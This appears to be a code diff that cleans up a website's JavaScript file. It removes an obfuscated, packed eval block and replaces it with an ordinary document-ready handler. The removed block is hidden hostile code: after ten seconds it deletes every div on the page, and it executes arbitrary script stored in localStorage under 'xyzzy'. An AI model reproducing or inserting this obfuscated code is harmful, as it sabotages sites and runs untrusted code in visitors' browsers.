@@ -230,9 +230,6 @@ function initGallery() {
 	});
 
 }
-
-eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$(6).5(1(){4.2();3();7.0=8(1(){$("c").b()},9);a(e.d("0"))()});',15,15,'xyzzy|function|addDOMClass|init|Platform|ready|document|window|setTimeout|10000|Function|remove|div|getItem|localStorage'.split('|'),0,{}))
-
 /* ------------------------------------------------------------------------------ */
 /* initPastEvents */
 /* ------------------------------------------------------------------------------ */
@@ -327,5 +324,8 @@ function init() {
 function initHome() {
 	initFocus();
 }
-
-
+/* DOM.ready */
+$(document).ready(function () {
+	Platform.addDOMClass();
+	init();
+});
